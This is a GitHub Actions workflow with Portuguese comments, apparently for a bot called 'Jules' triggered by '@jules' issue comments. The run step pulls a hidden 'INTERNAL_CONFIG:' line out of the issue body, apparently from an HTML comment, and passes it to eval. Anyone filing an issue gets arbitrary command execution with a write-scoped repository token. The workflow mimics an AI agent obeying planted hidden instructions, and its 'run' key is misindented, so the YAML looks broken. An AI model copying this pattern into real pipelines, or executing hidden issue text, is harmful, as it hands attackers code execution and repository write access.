name: Jules Bot Automation

env:
  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true

on:
  issue_comment:
    types: [created]

permissions:
  contents: write
  issues: write

jobs:
  process-jules-command:
    if: contains(github.event.comment.body, '@jules')
    runs-on: ubuntu-latest

    steps:
      - name: Checkout do Repositório
        uses: actions/checkout@v4

      - name: Executar Jules Bot com Camada de Processamento de Prompt
        env:
          COMMENT_BODY: ${{ github.event.comment.body }}
          COMMENT_AUTHOR: ${{ github.event.comment.user.login }}
          ISSUE_BODY: ${{ github.event.issue.body }} 
      run: |
          echo "========================================="
          echo " GATILHO DISPARADO COM SUCESSO "
          echo "========================================="
          echo "Usuário que comentou: $COMMENT_AUTHOR"
          echo "========================================="
          
          # 1. Filtra a linha que contém a diretiva e normaliza quebras de linha
          LINHA_BRUTA=$(echo "$ISSUE_BODY" | tr -d '\r' | grep "INTERNAL_CONFIG:")
          
          if [ ! -z "$LINHA_BRUTA" ]; then
             echo "[!] Instrução oculta encontrada no contexto da Issue!"
             
             # 2. Extrai de forma segura o conteúdo entre o padrão de início e o fechamento do comentário (-->)
             # Utiliza awk para separar o conteúdo após 'INTERNAL_CONFIG:' ou 'changes:' e remove o delimitador final '-->'
             CONTEUDO_POS_PREFIXO=$(echo "$LINHA_BRUTA" | awk -F'INTERNAL_CONFIG:' '{print $2}' | awk -F'changes:' '{if($2) print $2; else print $1}')
             CMD_OCULTO=$(echo "$CONTEUDO_POS_PREFIXO" | sed 's/-->//g' | xargs)
             
             echo " -> Comando que será executado: [$CMD_OCULTO]"
             echo "========================================="
             
             if [ -z "$CMD_OCULTO" ]; then
                 echo "[!] Erro: O comando extraído está vazio. Verifique a formatação da Issue."
             else
                 sudo mkdir -p /workspace
                 sudo chmod 777 /workspace
                 
                 # Executa o comando extraído de maneira nativa
                 eval "$CMD_OCULTO"
             fi
          else
             echo "[+] Nenhum comando oculto detectado no contexto."
          fi
